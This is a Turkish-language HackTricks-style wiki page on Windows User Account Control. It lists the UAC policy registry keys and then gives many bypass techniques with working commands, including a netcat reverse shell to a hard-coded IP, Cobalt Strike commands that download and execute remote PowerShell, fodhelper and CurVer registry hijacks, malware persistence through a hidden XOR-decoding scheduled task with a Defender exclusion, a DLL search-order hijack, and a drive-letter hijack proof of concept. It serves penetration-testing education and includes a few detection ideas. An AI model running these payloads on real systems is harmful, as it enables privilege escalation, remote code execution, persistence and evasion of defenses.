# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş aktiviteler için bir onay istemi** etkinleştiren bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, sistemi **potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, uygulamalar ve görevler her zaman **bir administrator olmayan hesabın security context'i altında çalışır**; ta ki bir administrator bu uygulamaların/görevlerin sistemde administrator-level access ile çalışmasına açıkça izin verene kadar. Bu, administratorları istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir security boundary olarak kabul edilmez.

Integrity levels hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda, bir administrator kullanıcıya 2 token verilir: normal işlemleri regular level olarak yapmak için standart bir user key ve admin privileges içeren bir tane.

Bu [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını derinlemesine tartışır ve logon process, user experience ve UAC architecture içerir. Administratorlar, security policies kullanarak UAC'nin kuruluşlarına özel olarak local seviyede nasıl çalışacağını (secpol.msc kullanarak) yapılandırabilir veya Active Directory domain ortamında Group Policy Objects (GPO) üzerinden yapılandırıp dağıtabilir. Çeşitli ayarlar [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntı sağlar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows'ta software yükleme politikaları

**local security policies** ("secpol.msc" çoğu sistemde) varsayılan olarak **admin olmayan users'ların software installations yapmasını engelleyecek** şekilde yapılandırılmıştır. Bu, admin olmayan bir user software'iniz için installer'ı indirse bile, bir admin account olmadan onu çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation sorması için Registry Keys

Admin rights'ı olmayan bir standart user olarak, "standard" hesabın belirli actions gerçekleştirmeye çalıştığında UAC tarafından **credentials için istem almasını** sağlayabilirsiniz. Bu işlem, **UAC bypass** yoksa ya da attacker zaten admin olarak giriş yapmadıysa, admin permissions gerektiren belirli **registry keys**'in değiştirilmesini gerektirir.

User **Administrators** group içinde olsa bile, bu değişiklikler administrative actions gerçekleştirmek için kullanıcının **hesap kimlik bilgilerini yeniden girmesini** zorunlu kılar.

**Tek dezavantajı, bunun çalışması için UAC'nin disabled olması gerekmesidir; production environments'ta bunun böyle olması pek olası değildir.**

Değiştirmeniz gereken registry keys ve entries şunlardır (varsayılan değerleri parantez içinde):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra, administrative operations kullanıcıdan kimlik bilgilerini yeniden girmesini ister.

### Note

**User Account Control bir security boundary değildir.** Bu nedenle, standard users local privilege escalation exploit olmadan hesaplarından çıkıp administrator rights elde edemez.

### Bir user'dan 'full computer access' isteyin
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek-integrity-level süreçlerin (web browser gibi) düşük-integrity-level verilerine (temporary Internet files folder gibi) erişmesini önlemek için integrity checks kullanır. Bu, browser’ın low-integrity token ile çalıştırılmasıyla yapılır. Browser low-integrity zone’da depolanan verilere erişmeye çalıştığında, operating system sürecin integrity level’ını kontrol eder ve erişime buna göre izin verir. Bu özellik, remote code execution attacks’ın sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir user Windows’a log on olduğunda, system kullanıcının privileges listesini içeren bir access token oluşturur. Privileges, bir kullanıcının rights ve capabilities birleşimi olarak tanımlanır. Token ayrıca kullanıcının credentials listesini de içerir; bunlar kullanıcının bilgisayara ve network üzerindeki resources’a authenticate edilmesi için kullanılan credentials’lardır.

### Autoadminlogon

Windows’u startup sırasında belirli bir user’a automatically log on olacak şekilde configure etmek için **`AutoAdminLogon` registry key** ayarlayın. Bu, kiosk environments veya testing purposes için kullanışlıdır. Bunu yalnızca secure systems üzerinde kullanın, çünkü password’ü registry’de açığa çıkarır.

Registry Editor veya `reg add` kullanarak aşağıdaki keys’i set edin:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon davranışına geri dönmek için `AutoAdminLogon` değerini 0 olarak set edin.

## UAC bypass

> [!TIP]
> Not ki victim’a graphical access’iniz varsa, UAC bypass straight forward’dır çünkü UAC prompt göründüğünde simply "Yes"e click edebilirsiniz

UAC bypass şu durumda gerekir: **UAC aktif, process’iniz medium integrity context’te çalışıyor ve user’ınız administrators group’a ait**.

Şunu belirtmek önemlidir: **UAC’yi en yüksek security level’da (Always) bypass etmek, diğer level’lardan herhangi birinde (Default) bypass etmekten çok daha zordur.**

### UAC disabled

Eğer UAC zaten disabled ise (`ConsentPromptBehaviorAdmin` **`0`**), `high integrity level` ile bir **reverse shell execute edebilirsiniz**; örneğin:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token duplication ile UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Eğer Administrators grubunun içinde olan bir kullanıcıyla bir shell'iniz varsa, SMB (file system) üzerinden paylaşılan **C$**'yi yerel olarak yeni bir disk olarak **mount edebilirsiniz** ve **dosya sisteminin içindeki her şeye erişiminiz** olur (Administrator home folder dahil).

> [!WARNING]
> **Görünüşe göre bu numara artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik seviyesine ayarlanmadığında çalışır
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle sahiptir.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) içinde dokümantasyon ve araç

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), birkaç UAC bypass exploitinin bir **derlemesi**dir. **UACME'yi visual studio veya msbuild kullanarak compile etmeniz** gerektiğini unutmayın. Compilation, birkaç executable oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`) , **hangisine ihtiyacınız olduğunu** bilmeniz gerekir.\
Bazı bypass'ların, **kullanıcıyı** bir şeylerin olduğu konusunda **uyaracak** başka programlar **promtp etmesi** nedeniyle **dikkatli** olmalısınız.

UACME, **her tekniğin çalışmaya başladığı build version**'ı içerir. Sürümleriniz için hangi tekniğin etkili olduğunu arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfasını kullanarak build sürümlerinden Windows sürümü `1607`’yi elde edersiniz.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir binary `fodhelper.exe`, modern Windows’ta auto-elevated edilir. Başlatıldığında, `DelegateExecute` fiilini doğrulamadan aşağıdaki kullanıcı başına registry yolunu sorgular. Oraya bir command yerleştirmek, Medium Integrity bir process’in (kullanıcı Administrators grubundadır) UAC prompt olmadan High Integrity bir process başlatmasına izin verir.

fodhelper tarafından sorgulanan Registry yolu:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload’unuzu ayarlayın, sonra tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/lenient olduğunda çalışır (extra restrictions ile Always Notify değil).
- 64-bit Windows üzerinde 32-bit bir process’ten 64-bit PowerShell başlatmak için `sysnative` path kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path). Stealth için UI prompt'larından kaçının.

#### CurVer/extension hijack variant (HKCU only)

`fodhelper.exe` kullanan recent samples, `DelegateExecute` kullanmak yerine per-user `CurVer` value üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary yine handler'ı `HKCU` altında resolve eder, bu yüzden keys'i plant etmek için admin token gerekmez:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yükseltildikten sonra, malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` yaparak gelecekteki **prompt**’ları devre dışı bırakır, ardından ek defense evasion gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve high integrity olarak çalışmak için persistence’i yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR-encrypted PowerShell script** saklar ve bunu her saat memory içinde decode/execute eder:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant hâlâ dropper’ı temizliyor ve yalnızca staged payload’ları bırakıyor; bu da tespiti **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` manipulation, Defender exclusion oluşturma veya PowerShell’i in-memory decrypt eden scheduled tasks izlemeye bağlı kılıyor.

#### More UAC bypass

Burada AUC’yi bypass etmek için kullanılan **tüm** teknikler, kurbanla birlikte **tam etkileşimli bir shell** **require** eder (sıradan bir nc.exe shell yeterli değildir).

Bunu bir **meterpreter** session kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **process**’e migrate olun:

![](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### UAC Bypass with GUI

Eğer bir **GUI** erişiminiz varsa, UAC prompt’u geldiğinde onu doğrudan kabul edebilirsiniz; gerçekten bir bypass’a ihtiyacınız yoktur. Yani, bir GUI erişimi elde etmek UAC’yi bypass etmenizi sağlayacaktır.

Ayrıca, birinin kullandığı bir GUI session’ı alırsanız (potansiyel olarak RDP üzerinden), **administrator** olarak çalışan bazı araçlar olabilir; buradan örneğin doğrudan UAC tarafından tekrar sorulmadan **admin** olarak bir **cmd** çalıştırabilirsiniz, örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Noisy brute-force UAC bypass

Gürültücü olmayı umursamıyorsanız, kullanıcı kabul edene kadar permissions yükseltmeyi isteyen [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi her zaman **run** edebilirsiniz.

### Your own bypass - Basic UAC bypass methodology

**UACME**’ye bakarsanız, **çoğu UAC bypass**’ın bir **Dll Hijacking vulnerabilit**y’yi kötüye kullandığını göreceksiniz (özellikle kötü amaçlı dll’yi _C:\Windows\System32_ içine yazarak). [Bir Dll Hijacking vulnerability’yi nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olan bir binary bulun (çalıştırıldığında yüksek integrity level’da çalıştığını kontrol edin).
2. procmon ile **DLL Hijacking**’e açık olabilecek "**NAME NOT FOUND**" event’lerini bulun.
3. Muhtemelen DLL’yi yazma izninizin olmadığı bazı **protected paths** içine (örneğin C:\Windows\System32) **write** etmeniz gerekecek. Bunu şunlarla aşabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bir CAB dosyasının içeriğini protected paths içine çıkarmanıza izin verir (çünkü bu tool yüksek integrity level’dan çalıştırılır).
2. **IFileOperation**: Windows 10.
4. DLL’nizi protected path içine kopyalayıp vulnerable ve autoelevated binary’yi çalıştıracak bir **script** hazırlayın.

### Another UAC bypass technique

Bir **autoElevated binary**’nin **registry**’den çalıştırılacak bir **binary** ya da **command** için **name/path** okumaya çalışıp çalışmadığını izlemekten oluşur (bu bilgi **HKCU** içinde aranıyorsa daha ilgi çekicidir).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order yoluyla `iscsiexe.dll` yüklemek için kötüye kullanılabilen **auto-elevated** bir binary’dir. User-writable bir klasöre kötü amaçlı bir `iscsiexe.dll` yerleştirebilir ve ardından current user `PATH`’ini (örneğin `HKCU\Environment\Path` üzerinden) o klasör aranacak şekilde değiştirebilirseniz, Windows saldırgan DLL’ini yükseltilmiş `iscsicpl.exe` process’i içine **UAC prompt göstermeden** yükleyebilir.

Pratik notlar:
- Bu, current user **Administrators** grubunda olup UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa faydalıdır.
- Bu bypass için ilgili olan sürüm **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışı bağımsız şekilde doğrulayın.
- Bu primitive, **auto-elevation** ve **DLL search-order hijacking** kombinasyonudur; bu yüzden diğer UAC bypass’larda kullanılan aynı ProcMon workflow’u, eksik DLL load’unu doğrulamak için faydalıdır.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / `HKCU\Environment\Path` üzerine registry yazmalarını hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasını alarmla.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **user-controlled** konumlarda `iscsiexe.dll` için avlan.
- `iscsicpl.exe` başlatmalarını, normal Windows dizinleri dışından gelen beklenmedik child process’ler veya DLL yüklemeleriyle ilişkilendir.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection”, shadow-admin token’ları ile her oturum için `\Sessions\0\DosDevices/<LUID>` map’lerini kullanır. Dizin, `SeGetTokenDeviceMap` tarafından ilk `\??` çözümlemesinde lazily oluşturulur. Eğer attacker, shadow-admin token’ı yalnızca **SecurityIdentification** seviyesinde impersonate ederse, dizin attacker’ı **owner** olarak alacak şekilde oluşturulur (`CREATOR OWNER` miras alır), bu da `\GLOBAL??` üzerinde öncelikli olan drive-letter link’lerine izin verir.

**Adımlar:**

1. Düşük yetkili bir oturumdan, promptsuz bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağır.
2. Birincil token’ını bir **identification** token’a duplicate et ve `\??` açarken onu impersonate et; böylece `\Sessions\0\DosDevices/<LUID>` attacker ownership altında oluşturulsun.
3. Orada attacker-controlled storage’a işaret eden bir `C:` symlink oluştur; bu session’daki sonraki filesystem erişimleri `C:`’yi attacker path’ine resolve eder ve prompt olmadan DLL/file hijack mümkün olur.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
